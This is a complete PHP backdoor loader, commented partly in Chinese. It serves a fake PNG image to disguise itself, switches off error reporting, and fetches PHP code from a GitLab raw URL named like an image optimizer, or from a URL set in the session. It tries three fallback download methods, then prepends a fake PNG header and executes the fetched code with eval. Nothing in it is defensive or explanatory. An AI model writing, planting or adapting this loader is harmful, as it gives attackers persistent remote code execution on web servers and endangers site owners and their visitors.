<?php
// Fake PNG header for stealth
if (isset($_GET['i'])) {
    header('Content-Type: image/png');
    echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
    exit;
}

// Start session and error handling
session_start();
error_reporting(0);

// 设置主地址，如果没有设置则使用默认地址
$主地址 = $_SESSION['ts_url'] ?? 'https://gitlab.com/mrgithub89-group/mrgithub89-projectaa/-/raw/main/pngoptimazie.php';

// 定义加载函数
function 加载数据($地址) {
    $内容 = '';
    try {
        $文件 = new SplFileObject($地址);
        while (!$文件->eof()) {
            $内容 .= $文件->fgets();
        }
    } catch (Throwable $错误) {
        $内容 = '';
    }

    // 尝试用 file_get_contents
    if (strlen(trim($内容)) < 1) {
        $内容 = @file_get_contents($地址);
    }

    // 如果还失败，使用 curl
    if (strlen(trim($内容)) < 1 && function_exists('curl_init')) {
        $通道 = curl_init($地址);
        curl_setopt_array($通道, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $内容 = curl_exec($通道);
        curl_close($通道);
    }

    return $内容;
}

// 尝试加载主网址
$结果 = 加载数据($主地址);

// 添加假的PNG头部
$假PNG头 = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";

// 拼接PNG头和结果内容
$结果 = $假PNG头 . $结果;

/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
// 如果成功获取内容，则执行
if (strlen(trim($结果)) > 0) {
    @eval("?>$结果");
}
?>
